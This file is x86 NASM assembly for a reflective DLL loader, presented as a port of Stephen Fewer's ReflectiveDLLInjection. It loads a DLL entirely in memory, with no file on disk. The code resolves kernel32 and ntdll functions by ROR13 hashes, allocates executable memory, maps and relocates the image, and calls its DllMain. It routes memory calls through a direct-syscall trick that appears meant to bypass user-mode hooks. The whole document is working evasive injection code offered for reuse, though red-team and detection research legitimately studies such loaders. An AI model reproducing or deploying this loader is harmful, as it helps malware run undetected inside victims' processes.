; =============================================================================
; ReflectiveLoader x86 - Position Independent Shellcode
; Port of: https://github.com/stephenfewer/ReflectiveDLLInjection
; Original author: Stephen Fewer / Harmony Security
; Author of this port: jbx81 (github.com/jbx81-1337)
; NASM syntax, Win32 stdcall ABI, no relocations
; Assemble: nasm -f bin reflective_loader_x86.asm -o reflective_loader_x86.bin
; =============================================================================

BITS 32

; ---------------------------------------------------------------------------
; Hash constants (same ROR13 algorithm as x64 — identical values)
; ---------------------------------------------------------------------------
KERNEL32DLL_HASH            EQU 0x6A4ABC5B
NTDLLDLL_HASH               EQU 0x3CFA685D
LOADLIBRARYA_HASH           EQU 0xEC0E4E8E
GETPROCADDRESS_HASH         EQU 0x7C0DFCAA
ZWALLOCATEVIRTUALMEMORY_HASH EQU 0xD33D4AED
ZWPROTECTVIRTUALMEMORY_HASH EQU 0xBC3F4D89
NTFLUSHINSTRUCTIONCACHE_HASH EQU 0x534C0AB8

; PE / reloc constants
IMAGE_DOS_SIGNATURE         EQU 0x5A4D
IMAGE_NT_SIGNATURE          EQU 0x00004550
IMAGE_ORDINAL_FLAG32        EQU 0x80000000
IMAGE_REL_BASED_ABSOLUTE    EQU 0
IMAGE_REL_BASED_HIGHLOW     EQU 3

MEM_RESERVE                 EQU 0x2000
MEM_COMMIT                  EQU 0x1000
PAGE_EXECUTE_READWRITE      EQU 0x40
DLL_PROCESS_ATTACH          EQU 1

; ---------------------------------------------------------------------------
; Stack frame layout (ebp-based, 4-byte slots)
;   [ebp - 4 ]  = pLoadLibraryA
;   [ebp - 8 ]  = pGetProcAddress
;   [ebp - 12]  = pZwAllocateVirtualMemory
;   [ebp - 16]  = pNtFlushInstructionCache
;   [ebp - 20]  = uiLibraryAddress  (source image base / later delta)
;   [ebp - 24]  = uiBaseAddress     (new alloc / module base during walk)
;   [ebp - 28]  = uiHeaderValue     (NT header VA)
;   [ebp - 32]  = uiExportDir
;   [ebp - 36]  = uiNameArray
;   [ebp - 40]  = uiNameOrdinals
;   [ebp - 44]  = uiAddressArray
;   [ebp - 48]  = uiValueA          (saved module list entry pointer)
;   [ebp - 52]  = uiValueB          (section count / reloc entry count)
;   [ebp - 56]  = uiValueC          (NumberOfNames)
;   [ebp - 60]  = uiValueD          (import desc ptr / reloc block ptr / DllMain VA)
;   [ebp - 64]  = uiValueE          (loaded library base / reloc page base)
;   [ebp - 68]  = usCounter
;   [ebp - 72]  = dwHashValue
;   [ebp - 76]  = pZwProtectVirtualMemory
; ---------------------------------------------------------------------------
%define pLoadLibraryA           dword [ebp -  4]
%define pGetProcAddress         dword [ebp -  8]
%define pZwAllocateVirtualMemory dword [ebp - 12]
%define pNtFlushInstructionCache dword [ebp - 16]
%define uiLibraryAddress        dword [ebp - 20]
%define uiBaseAddress           dword [ebp - 24]
%define uiHeaderValue           dword [ebp - 28]
%define uiExportDir             dword [ebp - 32]
%define uiNameArray             dword [ebp - 36]
%define uiNameOrdinals          dword [ebp - 40]
%define uiAddressArray          dword [ebp - 44]
%define uiValueA                dword [ebp - 48]
%define uiValueB                dword [ebp - 52]
%define uiValueC                dword [ebp - 56]
%define uiValueD                dword [ebp - 60]
%define uiValueE                dword [ebp - 64]
%define usCounter               dword [ebp - 68]
%define dwHashValue             dword [ebp - 72]
%define pZwProtectVirtualMemory  dword [ebp - 76]

; ============================================================================
; Entry: ReflectiveLoader()
;   Returns in EAX: VA of DllMain in newly mapped image
; ============================================================================
global ReflectiveLoader
ReflectiveLoader:
    ; ---- prologue -----------------------------------------------------------
    push    ebp
    mov     ebp, esp
    sub     esp, 80                    ; 76 bytes locals + 4 alignment
    push    ebx
    push    esi
    push    edi

    ; zero the function pointer slots
    xor     eax, eax
    mov     pLoadLibraryA, eax
    mov     pGetProcAddress, eax
    mov     pZwAllocateVirtualMemory, eax
    mov     pNtFlushInstructionCache, eax
    mov     pZwProtectVirtualMemory, eax

    ; disable base address parameter — compatible with standard reflective loader
    xor     ecx, ecx
    test    ecx, ecx
    jnz     .found_base

    ; =========================================================================
    ; STEP 0: find our own image base by scanning backwards from EIP
    ; =========================================================================
    call    .get_eip
.get_eip:
    pop     ecx                         ; ecx = address of this pop instruction

    ; page-align downward and scan for MZ + valid PE signature
    and     ecx, 0xFFFFF000
.scan_page:
    cmp     word [ecx], IMAGE_DOS_SIGNATURE
    jne     .next_page
    ; check e_lfanew range [0x40 .. 0x400)
    mov     eax, dword [ecx + 0x3C]
    cmp     eax, 0x40
    jb      .next_page
    cmp     eax, 0x400
    jae     .next_page
    ; check NT signature
    cmp     dword [ecx + eax], IMAGE_NT_SIGNATURE
    je      .found_base
.next_page:
    sub     ecx, 0x1000
    jmp     .scan_page

.found_base:
    ; ecx = our DLL image base
    mov     uiLibraryAddress, ecx

    ; =========================================================================
    ; STEP 1: walk PEB -> LDR -> InMemoryOrderModuleList
    ;         find kernel32 and ntdll, resolve 5 function pointers by hash
    ; =========================================================================
    ; x86: PEB at FS:[0x30]
    mov     eax, dword fs:[0x30]        ; eax = PEB
    mov     eax, [eax + 0x0C]          ; eax = PEB.Ldr (PEB_LDR_DATA*)
    mov     eax, [eax + 0x14]          ; eax = InMemoryOrderModuleList.Flink

.walk_modules:
    test    eax, eax
    jz      .step2

    ; Save module list entry pointer
    mov     uiValueA, eax

    ; 32-bit LDR_DATA_TABLE_ENTRY (from InMemoryOrderLinks):
    ;   +0x10 DllBase
    ;   +0x24 BaseDllName.Length
    ;   +0x28 BaseDllName.Buffer

    movzx   ecx, word [eax + 0x24]    ; BaseDllName.Length (bytes)
    test    ecx, ecx
    jz      .next_module
    mov     edx, [eax + 0x28]         ; BaseDllName.Buffer (PWSTR)

    ; hash the module name (byte-by-byte over UTF-16LE, uppercase normalize)
    mov     edi, 0                   ; edi = hash accumulator
.hash_modname:
    ror     edi, 13
    movzx   ebx, byte [edx]
    cmp     bl, 'a'
    jb      .hash_no_upper
    sub     bl, 0x20                   ; to uppercase
.hash_no_upper:
    add     edi, ebx
    inc     edx
    dec     ecx
    jnz     .hash_modname

    ; check hashes
    cmp     edi, KERNEL32DLL_HASH
    je      .process_kernel32
    cmp     edi, NTDLLDLL_HASH
    je      .process_ntdll
    jmp     .next_module

    ; ------------------------------------------------------------------
    ; process_kernel32: find LoadLibraryA, GetProcAddress
    ; ------------------------------------------------------------------
.process_kernel32:
    mov     eax, uiValueA
    mov     esi, [eax + 0x10]         ; DllBase
    mov     uiBaseAddress, esi
    call    .get_export_info           ; sets uiExportDir, uiNameArray, uiNameOrdinals, uiValueC
    mov     usCounter, 2               ; we want 2 functions

.k32_export_loop:
    ; bounds check
    mov     eax, uiValueC
    test    eax, eax
    jz      .check_all_found
    dec     eax
    mov     uiValueC, eax

    ; hash the export name
    mov     ecx, uiNameArray
    mov     ecx, [ecx]                ; RVA of name
    add     ecx, uiBaseAddress         ; VA of name string
    call    .hash_funcname             ; returns hash in eax
    mov     dwHashValue, eax

    cmp     eax, LOADLIBRARYA_HASH
    je      .k32_store_func
    cmp     eax, GETPROCADDRESS_HASH
    je      .k32_store_func
    jmp     .k32_next_export

.k32_store_func:
    ; resolve function address via ordinal table
    mov     edx, uiExportDir
    mov     edx, [edx + 0x1C]         ; AddressOfFunctions RVA
    add     edx, uiBaseAddress         ; VA
    mov     ecx, uiNameOrdinals
    movzx   ecx, word [ecx]           ; ordinal index
    mov     edx, [edx + ecx*4]        ; function RVA
    add     edx, uiBaseAddress         ; function VA

    mov     eax, dwHashValue
    cmp     eax, LOADLIBRARYA_HASH
    jne     .k32_try_gpa
    mov     pLoadLibraryA, edx
    jmp     .k32_dec_counter
.k32_try_gpa:
    mov     pGetProcAddress, edx
.k32_dec_counter:
    mov     eax, usCounter
    dec     eax
    mov     usCounter, eax
    test    eax, eax
    jz      .check_all_found

.k32_next_export:
    add     uiNameArray, 4
    add     uiNameOrdinals, 2
    jmp     .k32_export_loop

    ; ------------------------------------------------------------------
    ; process_ntdll: find NtFlushInstructionCache, ZwAllocateVirtualMemory,
    ;                      ZwProtectVirtualMemory
    ; ------------------------------------------------------------------
.process_ntdll:
    mov     eax, uiValueA
    mov     esi, [eax + 0x10]         ; DllBase
    mov     uiBaseAddress, esi
    call    .get_export_info
    mov     usCounter, 3               ; we want 3 functions

.ntdll_export_loop:
    ; bounds check
    mov     eax, uiValueC
    test    eax, eax
    jz      .check_all_found
    dec     eax
    mov     uiValueC, eax

    mov     ecx, uiNameArray
    mov     ecx, [ecx]
    add     ecx, uiBaseAddress
    call    .hash_funcname
    mov     dwHashValue, eax

    cmp     eax, NTFLUSHINSTRUCTIONCACHE_HASH
    je      .ntdll_store_func
    cmp     eax, ZWALLOCATEVIRTUALMEMORY_HASH
    je      .ntdll_store_func
    cmp     eax, ZWPROTECTVIRTUALMEMORY_HASH
    je      .ntdll_store_func
    jmp     .ntdll_next

.ntdll_store_func:
    mov     edx, uiExportDir
    mov     edx, [edx + 0x1C]
    add     edx, uiBaseAddress
    mov     ecx, uiNameOrdinals
    movzx   ecx, word [ecx]
    mov     edx, [edx + ecx*4]
    add     edx, uiBaseAddress

    mov     eax, dwHashValue
    cmp     eax, NTFLUSHINSTRUCTIONCACHE_HASH
    jne     .ntdll_try_zw
    mov     pNtFlushInstructionCache, edx
    jmp     .ntdll_dec_counter
.ntdll_try_zw:
    cmp     eax, ZWALLOCATEVIRTUALMEMORY_HASH
    jne     .ntdll_try_zw_prot
    mov     pZwAllocateVirtualMemory, edx
    jmp     .ntdll_dec_counter
.ntdll_try_zw_prot:
    mov     pZwProtectVirtualMemory, edx
.ntdll_dec_counter:
    mov     eax, usCounter
    dec     eax
    mov     usCounter, eax
    test    eax, eax
    jz      .check_all_found

.ntdll_next:
    add     uiNameArray, 4
    add     uiNameOrdinals, 2
    jmp     .ntdll_export_loop

.check_all_found:
    cmp     pLoadLibraryA, 0
    jz      .next_module
    cmp     pGetProcAddress, 0
    jz      .next_module
    cmp     pZwAllocateVirtualMemory, 0
    jz      .next_module
    cmp     pZwProtectVirtualMemory, 0
    jz      .next_module
    cmp     pNtFlushInstructionCache, 0
    jnz     .step2

.next_module:
    mov     eax, uiValueA
    mov     eax, [eax]                ; Flink -> next LIST_ENTRY
    jmp     .walk_modules

    ; =========================================================================
    ; STEP 2: ZwAllocateVirtualMemory a new region and copy headers
    ; =========================================================================
.step2:
    mov     ecx, uiLibraryAddress
    mov     eax, [ecx + 0x3C]
    add     eax, ecx                   ; eax = NT headers VA
    mov     uiHeaderValue, eax

    ; ZwAllocateVirtualMemory(-1, &BaseAddress, 0, &RegionSize,
    ;                         MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    ; SizeOfImage at NT + 0x50
    sub     esp, 8
    mov     dword [esp], 0             ; local BaseAddress = NULL
    mov     edx, uiHeaderValue
    mov     edx, [edx + 0x50]         ; SizeOfImage
    mov     [esp + 4], edx             ; local RegionSize = SizeOfImage
    ; push args right-to-left (stdcall)
    push    PAGE_EXECUTE_READWRITE     ; arg6: Protect
    push    MEM_RESERVE | MEM_COMMIT   ; arg5: AllocationType
    lea     eax, [esp + 12]            ; &RegionSize
    push    eax                        ; arg4: pRegionSize
    push    0                          ; arg3: ZeroBits = 0
    lea     eax, [esp + 16]            ; &BaseAddress
    push    eax                        ; arg2: pBaseAddress
    push    -1                         ; arg1: ProcessHandle = current process
    mov     edx, pZwAllocateVirtualMemory
    call    .direct_syscall            ; stdcall, callee cleans 24 bytes
    mov     eax, [esp]                 ; retrieve allocated BaseAddress
    add     esp, 8                     ; free locals
    mov     uiBaseAddress, eax

    ; copy headers
    mov     edx, uiHeaderValue
    mov     ecx, [edx + 0x54]         ; SizeOfHeaders
    mov     esi, uiLibraryAddress
    mov     edi, uiBaseAddress
    rep movsb

    ; =========================================================================
    ; STEP 3: copy sections
    ; =========================================================================
    mov     edx, uiHeaderValue
    movzx   eax, word [edx + 0x14]    ; SizeOfOptionalHeader
    lea     ebx, [edx + 0x18 + eax]   ; first IMAGE_SECTION_HEADER
    movzx   eax, word [edx + 0x06]    ; NumberOfSections
    mov     uiValueB, eax

.copy_sections:
    cmp     uiValueB, 0
    jz      .step4

    ; destination: uiBaseAddress + section.VirtualAddress
    mov     eax, [ebx + 0x0C]
    mov     edi, uiBaseAddress
    add     edi, eax

    ; source: uiLibraryAddress + section.PointerToRawData
    mov     eax, [ebx + 0x14]
    mov     esi, uiLibraryAddress
    add     esi, eax

    ; size: SizeOfRawData
    mov     ecx, [ebx + 0x10]
    rep movsb

    add     ebx, 40                    ; sizeof(IMAGE_SECTION_HEADER) = 40
    dec     uiValueB
    jmp     .copy_sections

    ; =========================================================================
    ; STEP 4: process import table
    ; =========================================================================
.step4:
    ; IMAGE_DIRECTORY_ENTRY_IMPORT (index 1)
    ; PE32: DataDirectory[1] = NT + 0x78 + 1*8 = NT + 0x80
    mov     edx, uiHeaderValue
    mov     eax, [edx + 0x80]         ; import dir VirtualAddress
    test    eax, eax
    jz      .step5
    add     eax, uiBaseAddress
    mov     uiValueD, eax             ; save import descriptor pointer

.import_desc_loop:
    mov     edx, uiValueD
    mov     eax, [edx + 0x0C]         ; Name RVA
    test    eax, eax
    jz      .step5

    ; LoadLibraryA(name)
    add     eax, uiBaseAddress
    push    eax
    call    pLoadLibraryA              ; stdcall, callee cleans 4 bytes
    mov     uiValueE, eax             ; loaded library base

    ; OriginalFirstThunk (prefer for lookup)
    mov     edx, uiValueD
    mov     eax, [edx + 0x00]         ; OriginalFirstThunk RVA
    test    eax, eax
    jnz     .have_oft
    mov     eax, [edx + 0x10]         ; fall back to FirstThunk
.have_oft:
    add     eax, uiBaseAddress
    mov     esi, eax                   ; esi = lookup thunk array (DWORD entries)

    ; FirstThunk (IAT) — this is what we patch
    mov     eax, [edx + 0x10]
    add     eax, uiBaseAddress
    mov     edi, eax                   ; edi = IAT entry (DWORD)

.iat_loop:
    ; read thunk value from lookup array
    mov     eax, [esi]
    test    eax, eax
    jz      .next_import_desc

    ; check IMAGE_ORDINAL_FLAG32
    test    eax, IMAGE_ORDINAL_FLAG32
    jnz     .import_by_ordinal

    ; import by name: eax = RVA of IMAGE_IMPORT_BY_NAME
    add     eax, uiBaseAddress
    add     eax, 2                     ; skip Hint (WORD), point to Name
    ; GetProcAddress(hModule, lpProcName)
    push    eax
    push    uiValueE
    call    pGetProcAddress            ; stdcall, callee cleans 8 bytes
    mov     [edi], eax                 ; patch IAT
    jmp     .next_iat

.import_by_ordinal:
    ; GetProcAddress(hModule, MAKEINTRESOURCE(ordinal))
    and     eax, 0xFFFF               ; ordinal = low 16 bits
    push    eax
    push    uiValueE
    call    pGetProcAddress
    mov     [edi], eax

.next_iat:
    add     esi, 4                     ; next lookup thunk (DWORD)
    add     edi, 4                     ; next IAT entry (DWORD)
    jmp     .iat_loop

.next_import_desc:
    add     uiValueD, 20              ; sizeof(IMAGE_IMPORT_DESCRIPTOR) = 20
    jmp     .import_desc_loop

    ; =========================================================================
    ; STEP 5: apply base relocations
    ; =========================================================================
.step5:
    ; delta = new_base - original ImageBase
    ; PE32: ImageBase at OptHdr+0x1C => NT+0x18+0x1C = NT+0x34
    mov     edx, uiHeaderValue
    mov     eax, uiBaseAddress
    sub     eax, [edx + 0x34]         ; delta = new_base - ImageBase
    mov     uiLibraryAddress, eax     ; reuse slot as delta

    ; reloc dir: PE32 DataDirectory[5] = NT+0x78 + 5*8 = NT+0xA0
    mov     eax, [edx + 0xA0]         ; reloc dir VirtualAddress
    test    eax, eax
    jz      .step6
    mov     ecx, [edx + 0xA4]         ; reloc dir Size
    test    ecx, ecx
    jz      .step6

    add     eax, uiBaseAddress
    mov     uiValueD, eax             ; first IMAGE_BASE_RELOCATION block

.reloc_block_loop:
    mov     edx, uiValueD
    mov     eax, [edx + 4]            ; SizeOfBlock
    test    eax, eax
    jz      .step6

    ; number of reloc entries = (SizeOfBlock - 8) / 2
    sub     eax, 8
    shr     eax, 1
    mov     uiValueB, eax

    ; block page base VA
    mov     eax, [edx + 0]            ; block VirtualAddress (DWORD)
    add     eax, uiBaseAddress
    mov     uiValueE, eax             ; page base VA

    lea     ebx, [edx + 8]            ; first WORD entry

.reloc_entry_loop:
    cmp     uiValueB, 0
    jz      .reloc_next_block

    movzx   eax, word [ebx]
    mov     ecx, eax
    shr     ecx, 12                    ; type = high 4 bits
    and     eax, 0x0FFF               ; offset = low 12 bits

    cmp     ecx, IMAGE_REL_BASED_HIGHLOW
    jne     .reloc_next_entry

    ; apply HIGHLOW relocation: add delta to DWORD at (page_base + offset)
    mov     edx, uiValueE
    add     edx, eax
    mov     ecx, uiLibraryAddress     ; delta
    add     [edx], ecx

.reloc_next_entry:
    add     ebx, 2
    dec     uiValueB
    jmp     .reloc_entry_loop

.reloc_next_block:
    mov     edx, uiValueD
    mov     eax, [edx + 4]            ; SizeOfBlock
    add     edx, eax
    mov     uiValueD, edx
    jmp     .reloc_block_loop

    ; =========================================================================
    ; STEP 6: set correct memory protections per section
    ; =========================================================================
.step6:
    ; re-derive NT header
    mov     ecx, uiBaseAddress
    mov     eax, [ecx + 0x3C]
    add     eax, ecx                   ; eax = NT headers VA
    mov     uiHeaderValue, eax

    ; walk section headers
    movzx   ecx, word [eax + 0x14]    ; SizeOfOptionalHeader
    lea     ecx, [eax + 0x18 + ecx]   ; first IMAGE_SECTION_HEADER
    mov     uiValueD, ecx             ; save section pointer
    movzx   eax, word [eax + 0x06]    ; NumberOfSections
    mov     uiValueB, eax

.protect_section_loop:
    cmp     uiValueB, 0
    jz      .step7

    mov     ebx, uiValueD              ; ebx = current section header

    ; skip if VirtualSize is 0
    mov     eax, [ebx + 0x08]         ; VirtualSize
    test    eax, eax
    jz      .protect_next_section

    ; derive protection from Characteristics (offset 0x24)
    ; bits: 29=EXECUTE, 30=READ, 31=WRITE -> shift to bits 0,1,2
    mov     eax, [ebx + 0x24]         ; Characteristics
    shr     eax, 29
    and     eax, 0x7                   ; 3-bit index: XRW

    ; PIC-safe lookup of protection table
    jmp    .prot_table
.got_prot_table:
    pop     ecx                        ; ecx = runtime address of .prot_table
    movzx   esi, byte [ecx + eax]
    jmp     .do_protect
.do_protect:
    ; esi = NewProtect

    ; ZwProtectVirtualMemory(-1, &BaseAddr, &RegionSize, NewProtect, &OldProtect)
    sub     esp, 12                    ; locals: BaseAddr(4), RegionSize(4), OldProtect(4)
    ; local BaseAddress = uiBaseAddress + section.VirtualAddress
    mov     eax, [ebx + 0x0C]         ; section VirtualAddress RVA
    add     eax, uiBaseAddress
    mov     [esp], eax                 ; local BaseAddress
    ; local RegionSize = section.VirtualSize
    mov     eax, [ebx + 0x08]         ; VirtualSize
    mov     [esp + 4], eax            ; local RegionSize
    mov     dword [esp + 8], 0        ; local OldProtect = 0
    ; push args right-to-left
    lea     eax, [esp + 8]
    push    eax                        ; arg5: &OldProtect
    push    esi                        ; arg4: NewProtect
    lea     eax, [esp + 12]
    push    eax                        ; arg3: &RegionSize
    lea     eax, [esp + 12]
    push    eax                        ; arg2: &BaseAddress
    push    -1                         ; arg1: ProcessHandle = current process
    mov     edx, pZwProtectVirtualMemory
    call    .direct_syscall            ; stdcall, callee cleans 20 bytes
    add     esp, 12                    ; free locals

.protect_next_section:
    add     uiValueD, 40              ; next section header
    dec     uiValueB
    jmp     .protect_section_loop

    ; =========================================================================
    ; STEP 7: call DllMain(hinstDLL, DLL_PROCESS_ATTACH, NULL)
    ; =========================================================================
.step7:
    ; re-derive NT header (may have been clobbered)
    mov     ecx, uiBaseAddress
    mov     eax, [ecx + 0x3C]
    add     eax, ecx                   ; eax = NT headers

    ; AddressOfEntryPoint at OptHdr+0x10 => NT+0x28
    mov     eax, [eax + 0x28]
    add     eax, uiBaseAddress         ; DllMain VA
    mov     uiValueD, eax             ; save

    ; NtFlushInstructionCache(-1, NULL, 0)
    push    0                          ; Length
    push    0                          ; BaseAddress
    push    -1                         ; ProcessHandle = current process
    call    pNtFlushInstructionCache   ; stdcall, callee cleans 12 bytes

    ; DllMain(hInstance, DLL_PROCESS_ATTACH, NULL)
    push    0                          ; lpvReserved
    push    DLL_PROCESS_ATTACH         ; fdwReason
    push    uiBaseAddress              ; hinstDLL
    call    uiValueD                   ; stdcall, callee cleans 12 bytes

    ; return DllMain VA in eax
    mov     eax, uiValueD

    ; ---- epilogue -----------------------------------------------------------
    pop     edi
    pop     esi
    pop     ebx
    mov     esp, ebp
    pop     ebp
    ret

    ; =========================================================================
    ; HELPER: .direct_syscall
    ; IN:  edx = address of Zw/Nt function stub
    ;      Stack has stdcall args pushed, then return address from call
    ; Extracts the syscall number from the stub's mov eax,<num> instruction
    ; and jumps past it into the syscall transition machinery.
    ; =========================================================================
.direct_syscall:
    mov     eax, dword [edx + 1]      ; syscall number from B8 xx xx xx xx
    lea     edx, [edx + 5]            ; past mov eax instruction
    jmp     edx

    ; =========================================================================
    ; HELPER: .get_export_info
    ; IN:  uiBaseAddress = module DllBase
    ; OUT: uiExportDir, uiNameArray, uiNameOrdinals, uiValueC=NumberOfNames
    ; CLOBBERS: eax, ecx, edx
    ; =========================================================================
.get_export_info:
    mov     edx, uiBaseAddress
    mov     eax, [edx + 0x3C]
    add     eax, edx                   ; eax = NT headers
    ; PE32: DataDirectory[0] (Export) = NT + 0x78
    mov     eax, [eax + 0x78]         ; export dir RVA
    add     eax, edx                   ; export dir VA
    mov     uiExportDir, eax
    ; NumberOfNames
    mov     ecx, [eax + 0x18]
    mov     uiValueC, ecx
    ; AddressOfNames
    mov     ecx, [eax + 0x20]
    add     ecx, edx
    mov     uiNameArray, ecx
    ; AddressOfNameOrdinals
    mov     ecx, [eax + 0x24]
    add     ecx, edx
    mov     uiNameOrdinals, ecx
    ret

    ; =========================================================================
    ; HELPER: .hash_funcname
    ; IN:  ecx = pointer to null-terminated ASCII function name
    ; OUT: eax = ROR13 hash
    ; CLOBBERS: ebx, ecx
    ; =========================================================================
.hash_funcname:
    mov     eax, 0
.hfn_loop:
    movzx   ebx, byte [ecx]
    test    ebx, ebx
    jz      .hfn_done
    ror     eax, 13
    add     eax, ebx
    inc     ecx
    jmp     .hfn_loop
.hfn_done:
    ret
.prot_table:
    call .got_prot_table
    ;       ---   X     R     XR    W     XW    RW    XRW
    db      0x01, 0x10, 0x02, 0x20, 0x04, 0x40, 0x04, 0x40